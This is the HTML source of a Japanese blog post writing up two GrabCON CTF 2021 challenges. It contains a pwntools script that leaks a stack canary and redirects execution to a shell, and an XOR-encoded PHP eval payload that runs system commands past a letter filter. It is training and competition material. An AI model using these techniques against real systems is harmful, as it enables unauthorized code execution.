@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>GrabCON CTF 2021 Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.thecybergrabs.org/ 結構、Server Errorが出てましたね。。 750点を獲得し、174位でした。 チャレンジのリスト。 [Pwn]: Can you? (100 points)" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.74.2 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/grabcon_ctf_2021/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="GrabCON CTF 2021 Writeup" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.thecybergrabs.org/ 結構、Server Errorが出てましたね。。 750点を獲得し、174位でした。 チャレンジのリスト。 [Pwn]: Can you? (100 points)" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/grabcon_ctf_2021/" />
+<meta property="article:published_time" content="2021-09-05T20:00:00+09:00" />
+<meta property="article:modified_time" content="2021-09-05T20:00:00+09:00" />
+<meta itemprop="name" content="GrabCON CTF 2021 Writeup">
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.thecybergrabs.org/ 結構、Server Errorが出てましたね。。 750点を獲得し、174位でした。 チャレンジのリスト。 [Pwn]: Can you? (100 points)">
+<meta itemprop="datePublished" content="2021-09-05T20:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2021-09-05T20:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="1118">
+
+
+
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="GrabCON CTF 2021 Writeup"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://ctf.thecybergrabs.org/ 結構、Server Errorが出てましたね。。 750点を獲得し、174位でした。 チャレンジのリスト。 [Pwn]: Can you? (100 points)"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">GrabCON CTF 2021 Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-09-05 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pwn-can-you-100-points">[Pwn]: Can you? (100 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-basic-calc-150-points">[Web]: Basic Calc (150 points)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
+<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fcybrics_ctf_2021%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://ctf.thecybergrabs.org/">https://ctf.thecybergrabs.org/</a>
+<br /><br />
+結構、Server Errorが出てましたね。。</p>
+<p><br /></p>
+<p>750点を獲得し、174位でした。</p>
+<br>
+<img src="https://captureamerica.github.io/writeups/img/grabcon_CTF_2021_Score1.png" alt="grabcon_CTF_2021_Score1.png">
+<br>
+<img src="https://captureamerica.github.io/writeups/img/grabcon_CTF_2021_Score2.png" alt="grabcon_CTF_2021_Score2.png">
+<p><br><br>
+チャレンジのリスト。</p>
+<img src="https://captureamerica.github.io/writeups/img/grabcon_CTF_2021_chall1.png" alt="grabcon_CTF_2021_chall1.png">
+<br>
+<img src="https://captureamerica.github.io/writeups/img/grabcon_CTF_2021_chall2.png" alt="grabcon_CTF_2021_chall2.png">
+<br>
+<img src="https://captureamerica.github.io/writeups/img/grabcon_CTF_2021_chall3.png" alt="grabcon_CTF_2021_chall3.png">
+<br>
+<p><br /><br /></p>
+<h2 id="pwn-can-you-100-points">[Pwn]: Can you? (100 points)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Can you?
+<br /><br />
+nc 35.246.42.94 31337</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>cancancan (ELF 32bit)</li>
+</ul>
+<p><br /></p>
+<h3 id="solution">Solution</h3>
+<p>checksecを確認。</p>
+<pre>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</pre>
+<p>タイトルなどから、Canaryに関連したチャレンジなのがわかります。</p>
+<p><br />
+Ghidraでコードを確認します。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="hl"><span class="lnt">27
+</span></span><span class="hl"><span class="lnt">28
+</span></span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">undefined4</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">init</span><span class="p">((</span><span class="n">EVP_PKEY_CTX</span> <span class="p">*)&amp;</span><span class="n">stack0x00000004</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;can you bypass me???&#34;</span><span class="p">);</span>
+  <span class="n">vuln</span><span class="p">();</span>
+  <span class="k">return</span> <span class="n">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="n">void</span> <span class="n">vuln</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">int</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
+  <span class="n">char</span> <span class="p">*</span><span class="n">__buf</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">uVar1</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">uVar2</span><span class="p">;</span>
+  <span class="n">int</span> <span class="n">local_78</span><span class="p">;</span>
+  <span class="n">char</span> <span class="n">local_74</span> <span class="p">[</span><span class="n">100</span><span class="p">];</span>
+  <span class="n">int</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">uVar2</span> <span class="p">=</span> <span class="n">0x80492d6</span><span class="p">;</span>
+  <span class="n">local_10</span> <span class="p">=</span> <span class="p">*(</span><span class="n">int</span> <span class="p">*)(</span><span class="n">in_GS_OFFSET</span> <span class="p">+</span> <span class="n">0x14</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span><span class="n">local_78</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span> <span class="n">local_78</span> <span class="p">&lt;</span> <span class="n">2</span><span class="p">;</span> <span class="n">local_78</span> <span class="p">=</span> <span class="n">local_78</span> <span class="p">+</span> <span class="n">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">uVar1</span> <span class="p">=</span> <span class="n">0x200</span><span class="p">;</span>
+    <span class="n">__buf</span> <span class="p">=</span> <span class="n">local_74</span><span class="p">;</span>
+<span class="hl">    <span class="n">read</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="n">__buf</span><span class="p">,</span><span class="n">0x200</span><span class="p">);</span>
+</span><span class="hl">    <span class="n">printf</span><span class="p">(</span><span class="n">local_74</span><span class="p">,</span><span class="n">__buf</span><span class="p">,</span><span class="n">uVar1</span><span class="p">,</span><span class="n">uVar2</span><span class="p">);</span>
+</span>  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="p">!=</span> <span class="p">*(</span><span class="n">int</span> <span class="p">*)(</span><span class="n">in_GS_OFFSET</span> <span class="p">+</span> <span class="n">0x14</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">__stack_chk_fail_local</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="n">void</span> <span class="n">win</span><span class="p">(</span><span class="n">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">system</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br />
+Buffer Overflow と、Format String Bug (書式文字列攻撃) の両方の脆弱性がありますね。</p>
+<p><br />
+&ldquo;ctf 32bit canary fsb leak&rdquo; でググったら、以下のWikiでほぼそのまんまの内容が見つかりました。</p>
+<p><a href="https://wiki.vaala.cloud/pwn/linux/mitigation/canary/#canary-leaks-canary">https://wiki.vaala.cloud/pwn/linux/mitigation/canary/#canary-leaks-canary</a></p>
+<p><br /></p>
+<p>書いたコード（ほぼ流用）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;cancancan&#39;</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;35.246.42.94&#39;</span><span class="p">,</span> <span class="mi">31337</span><span class="p">)</span>
+
+<span class="c1"># Leak Canary</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;can you bypass me???&#34;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">100</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">100</span><span class="p">)</span>
+<span class="n">Canary</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span><span class="o">-</span><span class="mh">0xa</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Canary:&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">Canary</span><span class="p">))</span>
+
+<span class="c1"># Bypass Canary</span>
+<span class="n">addr_win</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./cancancan&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;win&#34;</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">100</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">Canary</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">12</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr_win</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p><br />
+Wikiではあんまり説明がなかったので補足すると、pwntoolsのsendlineは最後に改行 (&quot;\n&rdquo;) が入るので101バイトが書き込まれ、(&quot;\n&rdquo;) で Canary の &ldquo;\x00&rdquo; 部分が上書きされます。</p>
+<p>これによって、printfの結果がもともと&rdquo;\x00&quot;で止まるはずだったのが、Canaryを含めて出力されます。</p>
+<p>(&quot;\n&rdquo;)は &ldquo;\x0a&rdquo; なので、-0xa をしています。0xFFFFFF00 でゼロクリアでも同じ結果になるはず。</p>
+<p><br />
+Flag: <code>GrabCON{Byp4ss_can4ry_1s_fun!}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="web-basic-calc-150-points">[Web]: Basic Calc (150 points)</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>Ever used calc based on php?
+<br /><br />
+Link</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-1">Solution</h3>
+<p>ウェブサイトにアクセスすると、計算用のフォームと、PHPコードが表示されます。</p>
+<p>PHPのコード部分は以下でした。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;eq&#34;</span><span class="p">])){</span>
+    
+    <span class="nv">$eq</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;eq&#34;</span><span class="p">];</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[A-Za-z`]+/&#34;</span><span class="p">,</span><span class="nv">$eq</span><span class="p">)){</span>
+        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;BAD.&#34;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">echo</span> <span class="s2">&#34;Result: &#34;</span><span class="p">;</span>
+    <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo &#34;</span> <span class="o">.</span> <span class="nv">$eq</span> <span class="o">.</span> <span class="s2">&#34; ;&#34;</span><span class="p">);</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+  <span class="k">echo</span> <span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">,</span><span class="k">true</span><span class="p">);</span>  
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br />
+アルファベットを使わずにコマンドを入力しeval()に渡す、ということをしないといけません。</p>
+<p><br />
+これも、ググって調べると、どうやら Root-Me の「PHP Eval」という問題と同じみたいです。</p>
+<p>以下の Write Up を参考にさせていただきました。
+<a href="https://joshuanatan.medium.com/root-me-web-server-php-eval-f77584cae128">https://joshuanatan.medium.com/root-me-web-server-php-eval-f77584cae128</a></p>
+<p><br />
+コードは上記の Write Up をそのまま使ったので、ここには載せません。</p>
+<p><br /></p>
+<p>system(&ldquo;ls -al&rdquo;)を実行したいとすると、</p>
+<pre>
+system = ('('^'[').('$'^']').('('^'[').(')'^']').('%'^'@').('-'^'@')
+ls -al / = (','^'@').('('^'[').('['^'{').'-'.('!'^'@').(','^'@').('['^'{').'/'
+</pre>
+<p><br /></p>
+<p>以下をPOSTすることになります。</p>
+<pre>
+<font color="red">(</font>('('^'[').('$'^']').('('^'[').(')'^']').('%'^'@').('-'^'@')<font color="red">)</font><font color="red">(</font>(','^'@').('('^'[').('['^'{').'-'.('!'^'@').(','^'@').('['^'{').'/'<font color="red">)</font>
+</pre>
+<p>このようにカッコ（<font color="red">赤い</font>部分）をつけないと、単純にechoでコマンド自体が表示されて、コマンドの結果が得られません。</p>
+<p><br /></p>
+<p><code>ls -al /</code> を確認したら、/flagggg.txt があるのがわかります。</p>
+<p>ここで、</p>
+<p><code>cat /flagggg.txt</code> をやろうとすると、以下のようにエラーになってしまいました。</p>
+<img src="https://captureamerica.github.io/writeups/img/grabcon_CTF_2021_basic_calc.png" alt="grabcon_CTF_2021_basic_calc.png">
+<p><br /></p>
+<p><code>cat /*.txt</code> にて、フラグを得ることができました。</p>
+<p><br /></p>
+<p>Flag: GrabCON{b4by_php_f0r_y0u}</p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2021-09-05
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/rcts_cert_ctf_2021/">
+            <span class="next-text nav-default">RCTS CERT CTF 2021 Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
